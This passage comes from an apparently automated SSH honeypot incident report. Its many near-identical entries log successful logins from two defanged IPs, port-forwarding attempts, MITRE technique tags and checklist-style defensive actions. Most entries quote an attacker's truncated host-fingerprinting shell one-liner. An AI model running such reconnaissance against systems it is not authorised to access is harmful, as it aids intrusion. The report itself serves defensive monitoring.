| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:18:02` | `cowrie.session.connect` |
| `2026-08-25 12:18:04` | `cowrie.client.version` |
| `2026-08-25 12:18:04` | `cowrie.client.kex` |
| `2026-08-25 12:18:14` | `cowrie.login.success` |
| `2026-08-25 12:18:16` | `cowrie.session.params` |
| `2026-08-25 12:18:16` | `cowrie.command.input` |
| `2026-08-25 12:18:16` | `cowrie.command.input` |
| `2026-08-25 12:18:16` | `cowrie.command.input` |
| `2026-08-25 12:18:16` | `cowrie.command.input` |
| `2026-08-25 12:18:16` | `cowrie.command.input` |
| `2026-08-25 12:18:16` | `cowrie.command.success` |
| `2026-08-25 12:18:16` | `cowrie.command.input` |
| `2026-08-25 12:18:16` | `cowrie.command.input` |
| `2026-08-25 12:18:16` | `cowrie.command.input` |
| `2026-08-25 12:18:16` | `cowrie.command.input` |
| `2026-08-25 12:18:17` | `cowrie.log.closed` |
| `2026-08-25 12:18:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2799f3ca8bb

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 12:20 |
| **Last Seen** | 2026-08-25 12:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:20:36` | `cowrie.session.connect` |
| `2026-08-25 12:20:36` | `cowrie.client.version` |
| `2026-08-25 12:20:36` | `cowrie.client.kex` |
| `2026-08-25 12:20:39` | `cowrie.login.success` |
| `2026-08-25 12:20:41` | `cowrie.session.params` |
| `2026-08-25 12:20:41` | `cowrie.command.input` |
| `2026-08-25 12:20:41` | `cowrie.command.input` |
| `2026-08-25 12:20:41` | `cowrie.command.input` |
| `2026-08-25 12:20:41` | `cowrie.command.input` |
| `2026-08-25 12:20:41` | `cowrie.command.input` |
| `2026-08-25 12:20:41` | `cowrie.command.success` |
| `2026-08-25 12:20:41` | `cowrie.command.input` |
| `2026-08-25 12:20:41` | `cowrie.command.input` |
| `2026-08-25 12:20:41` | `cowrie.command.input` |
| `2026-08-25 12:20:41` | `cowrie.command.input` |
| `2026-08-25 12:20:42` | `cowrie.log.closed` |
| `2026-08-25 12:20:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-232379044cd4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 12:21 |
| **Last Seen** | 2026-08-25 12:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:21:41` | `cowrie.session.connect` |
| `2026-08-25 12:21:41` | `cowrie.client.version` |
| `2026-08-25 12:21:42` | `cowrie.client.kex` |
| `2026-08-25 12:21:43` | `cowrie.login.success` |
| `2026-08-25 12:21:43` | `cowrie.direct-tcpip.request` |
| `2026-08-25 12:21:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 12:21:43` | `cowrie.direct-tcpip.data` |
| `2026-08-25 12:21:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f768b2b41658

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 12:21 |
| **Last Seen** | 2026-08-25 12:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:21:46` | `cowrie.session.connect` |
| `2026-08-25 12:21:46` | `cowrie.client.version` |
| `2026-08-25 12:21:46` | `cowrie.client.kex` |
| `2026-08-25 12:21:47` | `cowrie.login.success` |
| `2026-08-25 12:21:49` | `cowrie.direct-tcpip.request` |
| `2026-08-25 12:21:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 12:21:49` | `cowrie.direct-tcpip.data` |
| `2026-08-25 12:21:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd3188fa78dc

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 12:23 |
| **Last Seen** | 2026-08-25 12:23 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:23:40` | `cowrie.session.connect` |
| `2026-08-25 12:23:40` | `cowrie.client.version` |
| `2026-08-25 12:23:40` | `cowrie.client.kex` |
| `2026-08-25 12:23:45` | `cowrie.login.success` |
| `2026-08-25 12:23:48` | `cowrie.session.params` |
| `2026-08-25 12:23:48` | `cowrie.command.input` |
| `2026-08-25 12:23:48` | `cowrie.command.input` |
| `2026-08-25 12:23:48` | `cowrie.command.input` |
| `2026-08-25 12:23:48` | `cowrie.command.input` |
| `2026-08-25 12:23:48` | `cowrie.command.input` |
| `2026-08-25 12:23:48` | `cowrie.command.success` |
| `2026-08-25 12:23:48` | `cowrie.command.input` |
| `2026-08-25 12:23:48` | `cowrie.command.input` |
| `2026-08-25 12:23:48` | `cowrie.command.input` |
| `2026-08-25 12:23:48` | `cowrie.command.input` |
| `2026-08-25 12:23:50` | `cowrie.log.closed` |
| `2026-08-25 12:23:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff60b766b0ee

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 12:25 |
| **Last Seen** | 2026-08-25 12:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:25:37` | `cowrie.session.connect` |
| `2026-08-25 12:25:38` | `cowrie.client.version` |
| `2026-08-25 12:25:38` | `cowrie.client.kex` |
| `2026-08-25 12:25:42` | `cowrie.login.success` |
| `2026-08-25 12:25:44` | `cowrie.session.params` |
| `2026-08-25 12:25:44` | `cowrie.command.input` |
| `2026-08-25 12:25:44` | `cowrie.command.input` |
| `2026-08-25 12:25:44` | `cowrie.command.input` |
| `2026-08-25 12:25:44` | `cowrie.command.input` |
| `2026-08-25 12:25:44` | `cowrie.command.input` |
| `2026-08-25 12:25:44` | `cowrie.command.success` |
| `2026-08-25 12:25:44` | `cowrie.command.input` |
| `2026-08-25 12:25:44` | `cowrie.command.input` |
| `2026-08-25 12:25:44` | `cowrie.command.input` |
| `2026-08-25 12:25:44` | `cowrie.command.input` |
| `2026-08-25 12:25:45` | `cowrie.log.closed` |
| `2026-08-25 12:25:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14e7efa6a480

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 12:27 |
| **Last Seen** | 2026-08-25 12:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:27:26` | `cowrie.session.connect` |
| `2026-08-25 12:27:26` | `cowrie.client.version` |
| `2026-08-25 12:27:26` | `cowrie.client.kex` |
| `2026-08-25 12:27:30` | `cowrie.login.success` |
| `2026-08-25 12:27:32` | `cowrie.session.params` |
| `2026-08-25 12:27:32` | `cowrie.command.input` |
| `2026-08-25 12:27:32` | `cowrie.command.input` |
| `2026-08-25 12:27:32` | `cowrie.command.input` |
| `2026-08-25 12:27:32` | `cowrie.command.input` |
| `2026-08-25 12:27:32` | `cowrie.command.input` |
| `2026-08-25 12:27:32` | `cowrie.command.success` |
| `2026-08-25 12:27:32` | `cowrie.command.input` |
| `2026-08-25 12:27:32` | `cowrie.command.input` |
| `2026-08-25 12:27:32` | `cowrie.command.input` |
| `2026-08-25 12:27:32` | `cowrie.command.input` |
| `2026-08-25 12:27:33` | `cowrie.log.closed` |
| `2026-08-25 12:27:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e0d1c5b7c5c

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 12:29 |
| **Last Seen** | 2026-08-25 12:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:29:55` | `cowrie.session.connect` |
| `2026-08-25 12:29:55` | `cowrie.client.version` |
| `2026-08-25 12:29:55` | `cowrie.client.kex` |
| `2026-08-25 12:29:59` | `cowrie.login.success` |
| `2026-08-25 12:30:01` | `cowrie.session.params` |
| `2026-08-25 12:30:01` | `cowrie.command.input` |
| `2026-08-25 12:30:01` | `cowrie.command.input` |
| `2026-08-25 12:30:01` | `cowrie.command.input` |
| `2026-08-25 12:30:01` | `cowrie.command.input` |
| `2026-08-25 12:30:01` | `cowrie.command.input` |
| `2026-08-25 12:30:01` | `cowrie.command.success` |
| `2026-08-25 12:30:01` | `cowrie.command.input` |
| `2026-08-25 12:30:01` | `cowrie.command.input` |
| `2026-08-25 12:30:01` | `cowrie.command.input` |
| `2026-08-25 12:30:01` | `cowrie.command.input` |
| `2026-08-25 12:30:02` | `cowrie.log.closed` |
| `2026-08-25 12:30:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-105011cf12e0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 12:31 |
| **Last Seen** | 2026-08-25 12:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:31:35` | `cowrie.session.connect` |
| `2026-08-25 12:31:35` | `cowrie.client.version` |
| `2026-08-25 12:31:35` | `cowrie.client.kex` |
| `2026-08-25 12:31:36` | `cowrie.login.success` |
| `2026-08-25 12:31:36` | `cowrie.direct-tcpip.request` |
| `2026-08-25 12:31:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 12:31:37` | `cowrie.direct-tcpip.data` |
| `2026-08-25 12:31:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b46c97529ff

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 12:31 |
| **Last Seen** | 2026-08-25 12:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:31:39` | `cowrie.session.connect` |
| `2026-08-25 12:31:39` | `cowrie.client.version` |
| `2026-08-25 12:31:40` | `cowrie.client.kex` |
| `2026-08-25 12:31:40` | `cowrie.login.success` |
| `2026-08-25 12:31:41` | `cowrie.direct-tcpip.request` |
| `2026-08-25 12:31:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 12:31:41` | `cowrie.direct-tcpip.data` |
| `2026-08-25 12:31:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abbdff604339

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 12:31 |
| **Last Seen** | 2026-08-25 12:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:31:43` | `cowrie.session.connect` |
| `2026-08-25 12:31:44` | `cowrie.client.version` |
| `2026-08-25 12:31:44` | `cowrie.client.kex` |
| `2026-08-25 12:31:46` | `cowrie.login.success` |
| `2026-08-25 12:31:48` | `cowrie.session.params` |
| `2026-08-25 12:31:48` | `cowrie.command.input` |
| `2026-08-25 12:31:48` | `cowrie.command.input` |
| `2026-08-25 12:31:48` | `cowrie.command.input` |
| `2026-08-25 12:31:48` | `cowrie.command.input` |
| `2026-08-25 12:31:48` | `cowrie.command.input` |
| `2026-08-25 12:31:48` | `cowrie.command.success` |
| `2026-08-25 12:31:48` | `cowrie.command.input` |
| `2026-08-25 12:31:48` | `cowrie.command.input` |
| `2026-08-25 12:31:48` | `cowrie.command.input` |
| `2026-08-25 12:31:48` | `cowrie.command.input` |
| `2026-08-25 12:31:49` | `cowrie.log.closed` |
| `2026-08-25 12:31:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5490d35376ce

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 12:34 |
| **Last Seen** | 2026-08-25 12:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:34:15` | `cowrie.session.connect` |
| `2026-08-25 12:34:15` | `cowrie.client.version` |
| `2026-08-25 12:34:15` | `cowrie.client.kex` |
| `2026-08-25 12:34:16` | `cowrie.login.success` |
| `2026-08-25 12:34:18` | `cowrie.session.params` |
| `2026-08-25 12:34:18` | `cowrie.command.input` |
| `2026-08-25 12:34:18` | `cowrie.command.input` |
| `2026-08-25 12:34:18` | `cowrie.command.input` |
| `2026-08-25 12:34:18` | `cowrie.command.input` |
| `2026-08-25 12:34:18` | `cowrie.command.input` |
| `2026-08-25 12:34:18` | `cowrie.command.success` |
| `2026-08-25 12:34:18` | `cowrie.command.input` |
| `2026-08-25 12:34:18` | `cowrie.command.input` |
| `2026-08-25 12:34:18` | `cowrie.command.input` |
| `2026-08-25 12:34:18` | `cowrie.command.input` |
| `2026-08-25 12:34:18` | `cowrie.log.closed` |
| `2026-08-25 12:34:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8a396c52cd3

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 12:36 |
| **Last Seen** | 2026-08-25 12:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:36:35` | `cowrie.session.connect` |
| `2026-08-25 12:36:35` | `cowrie.client.version` |
| `2026-08-25 12:36:35` | `cowrie.client.kex` |
| `2026-08-25 12:36:35` | `cowrie.login.success` |
| `2026-08-25 12:36:36` | `cowrie.session.params` |
| `2026-08-25 12:36:36` | `cowrie.command.input` |
| `2026-08-25 12:36:36` | `cowrie.command.input` |
| `2026-08-25 12:36:36` | `cowrie.command.input` |
| `2026-08-25 12:36:36` | `cowrie.command.input` |
| `2026-08-25 12:36:36` | `cowrie.command.input` |
| `2026-08-25 12:36:36` | `cowrie.command.success` |
| `2026-08-25 12:36:36` | `cowrie.command.input` |
| `2026-08-25 12:36:36` | `cowrie.command.input` |
| `2026-08-25 12:36:36` | `cowrie.command.input` |
| `2026-08-25 12:36:36` | `cowrie.command.input` |
| `2026-08-25 12:36:36` | `cowrie.log.closed` |
| `2026-08-25 12:36:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33a3c62bf328

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 12:39 |
| **Last Seen** | 2026-08-25 12:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:39:35` | `cowrie.session.connect` |
| `2026-08-25 12:39:36` | `cowrie.client.version` |
| `2026-08-25 12:39:36` | `cowrie.client.kex` |
| `2026-08-25 12:39:38` | `cowrie.login.success` |
| `2026-08-25 12:39:39` | `cowrie.session.params` |
| `2026-08-25 12:39:39` | `cowrie.command.input` |
| `2026-08-25 12:39:39` | `cowrie.command.input` |
| `2026-08-25 12:39:39` | `cowrie.command.input` |
| `2026-08-25 12:39:39` | `cowrie.command.input` |
| `2026-08-25 12:39:39` | `cowrie.command.input` |
| `2026-08-25 12:39:39` | `cowrie.command.success` |
| `2026-08-25 12:39:39` | `cowrie.command.input` |
| `2026-08-25 12:39:39` | `cowrie.command.input` |
| `2026-08-25 12:39:39` | `cowrie.command.input` |
| `2026-08-25 12:39:39` | `cowrie.command.input` |
| `2026-08-25 12:39:40` | `cowrie.log.closed` |
| `2026-08-25 12:39:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd10fed2de6e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 12:41 |
| **Last Seen** | 2026-08-25 12:41 |
| **Session Duration** | 1s |
